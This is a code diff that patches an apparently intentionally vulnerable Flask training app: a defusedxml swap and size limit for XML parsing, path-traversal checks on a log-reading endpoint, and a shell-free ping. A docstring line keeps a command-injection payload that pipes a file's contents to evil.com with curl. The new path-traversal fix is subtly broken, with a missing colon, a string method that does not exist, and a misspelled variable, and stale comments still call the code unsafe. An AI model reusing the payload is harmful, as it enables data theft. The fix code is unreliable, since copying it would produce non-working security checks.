@@ -14,8 +14,9 @@ import os, subprocess, sqlite3, pickle, base64, logging, urllib.request
 import hashlib, hmac, time, struct
 from urllib.parse import urlparse 
 import binascii
-from xml.etree import ElementTree as ET  
+from defusedxml import ElementTree as ET  
 from markupsafe import escape
+
 # XXE unsafe in some parsers; stdlib is still used here for demo
 # Note: Real XXE typically requires parsers that load external entities (e.g., lxml without defenses).
 # We keep a simplistic "bad" parse to illustrate unsafe parsing of untrusted XML.
@@ -887,10 +888,16 @@ EXAMPLE ATTACK (if using vulnerable parser):
 - Can lead to full system compromise
 - Often overlooked in security testing
 """
+MAX_XML_SIZE = 1_000_000  
 @app.post("/xml/parse")
 def xml_parse():
-    # ❌ BAD: parse untrusted XML directly; external entities may be abused with some parsers
+    
     xml = request.data or b"<root/>"
+    if len(xml) > MAX_XML_SIZE:
+        return err("xml too large",413)
+
+
+    
     try:
         # Standard library ET is safer, but concept demonstrates XXE risk
         root = ET.fromstring(xml)  # In other parsers, this could be dangerous
@@ -945,9 +952,24 @@ LOG_DIR = Path("./logs_bad"); LOG_DIR.mkdir(exist_ok=True)
 
 @app.get("/logs/read")
 def logs_read():
-    filename = request.args.get("file", "app.log")
+    filename = (request.args.get("file", "app.log") or "").strip()
     # ❌ BAD: naive join + weak check - allows path traversal
-    path = os.path.join(LOG_DIR, filename)  # "../" sequences not blocked!
+    if not filename:
+        return err("the filename doesn't exist", 404)
+
+    if filename != Path(filename).name:
+        return err("the path isn't the same",400)
+    try:
+        path = os.path.join(LOG_DIR, filename).resolved()
+    except Exception:
+        return err("invalid filename", 400)
+        # "../" sequences not blocked!
+    try:
+        if not path.is_relative_to(LOG_DIR.resolve())
+            return err("path is not relatie to",400)
+    except AttributeError:
+        if str(LOGDIR.resolve()) not in str(path):
+            return err("access denied",400)
     try:
         with open(path, "r", encoding="utf-8") as fh:
             return ok({"content": fh.read()})  # Reads ANY accessible file!
@@ -996,13 +1018,27 @@ curl "http://localhost:5000/sys/ping?host=127.0.0.1;curl evil.com --data \$(cat 
 - Very difficult to detect without proper monitoring
 - Often leads to complete system takeover
 """
+# @app.get("/sys/ping")
+# def sys_ping():
+#     host = request.args.get("host", "127.0.0.1")
+#     # ❌ EXTREMELY DANGEROUS: shell=True and user input concatenation
+#     cmd = f"ping -c 1 {host}"  # User input directly in shell command!
+#     out = subprocess.getoutput(cmd)  # Executes in shell - allows command injection!
+#     return ok({"cmd": cmd, "out": out})
 @app.get("/sys/ping")
-def sys_ping():
+def safe_ping():
     host = request.args.get("host", "127.0.0.1")
-    # ❌ EXTREMELY DANGEROUS: shell=True and user input concatenation
-    cmd = f"ping -c 1 {host}"  # User input directly in shell command!
-    out = subprocess.getoutput(cmd)  # Executes in shell - allows command injection!
-    return ok({"cmd": cmd, "out": out})
+    # Basic allowlist: digits and dots only
+    if not host.replace(".", "").isdigit():
+        return err("invalid_host", 400)
+    
+    # Use subprocess with shell=False
+    out = subprocess.run(["ping", "-c", "1", host],capture_output=True, text=True)
+    
+    return ok({"host": host, "out": out.stdout.strip()})
+
+
+
 
 
 # ===================================================================================
